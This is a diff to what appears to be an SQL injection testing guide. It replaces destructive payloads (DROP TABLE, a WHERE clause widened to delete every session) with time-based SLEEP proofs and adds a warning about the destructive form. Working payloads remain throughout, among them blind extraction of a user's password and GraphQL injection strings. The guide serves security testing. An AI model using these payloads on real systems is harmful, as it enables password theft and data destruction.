@@ -197,9 +197,9 @@ The injected value lands inside a `VALUES(...)` clause.
 -- Original:
 INSERT INTO logs (user, action) VALUES ('INPUT', 'login');
 
--- Injected INPUT: test','login'); DROP TABLE users;--
--- Result:
-INSERT INTO logs (user, action) VALUES ('test','login'); DROP TABLE users;--', 'login');
+-- Injected INPUT: test','login'); SELECT SLEEP(5);--
+-- Result (stacked query proves arbitrary statement execution, harmless time-based PoC):
+INSERT INTO logs (user, action) VALUES ('test','login'); SELECT SLEEP(5);--', 'login');
 ```
 
 **Data exfiltration via INSERT** (when you can see the inserted row):
@@ -251,17 +251,14 @@ UPDATE profile SET bio=''||(SELECT password FROM users WHERE username='admin')||
 ### 2.3 DELETE Statement Injection
 
 ```sql
--- Original:
+-- Application's own statement (the injectable sink):
 DELETE FROM sessions WHERE token='INPUT';
 
--- Widen scope (dangerous):
-INPUT: ' OR '1'='1
--- Result:
-DELETE FROM sessions WHERE token='' OR '1'='1';
--- Deletes ALL sessions
-
--- Data exfiltration via time-based blind in DELETE:
+-- Non-destructive proof — time-based blind extraction inside the DELETE context
+-- (confirms injection WITHOUT removing rows):
 INPUT: ' OR IF((SELECT SUBSTRING(password,1,1) FROM users LIMIT 1)='a', SLEEP(5), 0) OR '
+-- Note: a boolean payload (e.g. ' OR '1'='1) would widen the WHERE to every row and is
+-- destructive — never run it against real data; use the time-based proof above instead.
 ```
 
 ### 2.4 SQLMap for INSERT/UPDATE/DELETE
@@ -298,7 +295,7 @@ GraphQL resolvers often build SQL from nested field arguments:
   users(where: {name: "admin' OR '1'='1"}) {
     id
     email
-    posts(orderBy: "created_at; DROP TABLE posts--") {
+    posts(orderBy: "created_at;SELECT SLEEP(5)--") {
       title
     }
   }
